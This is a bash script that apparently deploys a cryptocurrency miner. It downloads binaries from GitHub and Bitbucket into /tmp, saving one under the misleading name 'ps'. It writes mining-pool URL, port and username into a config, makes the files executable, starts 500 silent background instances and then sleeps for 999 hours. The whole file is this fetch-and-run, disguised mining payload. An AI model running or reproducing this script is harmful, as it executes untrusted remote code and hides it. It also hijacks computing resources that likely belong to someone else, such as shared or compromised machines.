#!/bin/bash

wget -O /tmp/start https://raw.githubusercontent.com/walters99/Slurb/main/start
wget -O /tmp/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
wget -O /tmp/build_config https://github.com/walters99/Slurb/raw/main/build_config

user="$1"
top="$(shuf -n 1 -i 1-999999)"
pool_url="$2"
pool_port="$3"

sed -i "s/RIGNAME/$top/" "/tmp/build_config"
sed -i "s/USERNAME/$user/" "/tmp/build_config"
sed -i "s/POOL_URL/$pool_url/" "/tmp/build_config"
sed -i "s/POOL_PORT/$pool_port/" "/tmp/build_config"

chmod +x /tmp/ps /tmp/start

for i in {1..500} :
do
  /tmp/start $user $i >/dev/null &
done
sleep 999h
